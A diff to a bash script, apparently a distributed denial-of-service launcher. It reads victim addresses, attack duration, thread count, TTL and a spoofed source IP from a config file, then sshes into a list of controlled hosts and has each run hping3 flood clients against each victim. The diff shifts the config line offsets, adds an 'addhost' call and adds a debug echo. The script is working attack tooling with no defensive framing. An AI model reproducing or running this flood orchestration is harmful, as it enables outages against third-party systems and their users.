@@ -1,5 +1,7 @@
 #!/bin/bash
 
+addhost 2>/dev/null
+
 if [[ $1 = "" ]] 
 then
     echo -e "Usage: attack 'configfile.txt'"
@@ -14,19 +16,19 @@ then
 	exit
 fi
 
-declare -a HOSTS=($(cat hosts.txt))
+declare -a HOSTS=($(cat /tmp/hosts.txt))
 cnt=${#HOSTS[@]}
-mode=$(sed -n "2p" $1|awk '{print $2}')
-thread=$(sed -n "4p" $1|awk '{print $2}')
-attack_time=$(sed -n "6p" $1|awk '{print $2}')
-wait_time=$(sed -n "8p" $1|awk '{print $2}')
-source_ip=$(sed -n "10p" $1|awk '{print $2}')
-ttl=$(sed -n "12p" $1|awk '{print $2}')
-victim=$(sed -n "14p" $1|awk '{print $0}')
+mode=$(sed -n "6p" $1|awk '{print $2}')
+thread=$(sed -n "8p" $1|awk '{print $2}')
+attack_time=$(sed -n "10p" $1|awk '{print $2}')
+wait_time=$(sed -n "12p" $1|awk '{print $2}')
+source_ip=$(sed -n "14p" $1|awk '{print $2}')
+ttl=$(sed -n "16p" $1|awk '{print $2}')
+victim=$(sed -n "18p" $1|awk '{print $0}')
 
 #echo $1 $thread $attack_time $wait_time $source_ip $ttl $victim
 
-for i in $(seq 14 1 $tcnt)
+for i in $(seq 18 1 $tcnt)
 do
 	victim=$(sed -n "$i {p;q;}" $1|awk '{print $0}')
         nc -z -w $wait_time $victim
@@ -37,6 +39,7 @@ do
 			echo -e "正在攻击 $victim\n"
 			if [ $mode = "udp" ]
 			then
+				echo "???"
     				ssh ${HOSTS[k]} hping3u-client $victim $attack_time $ttl $thread $source_ip &
 			else
     				ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &
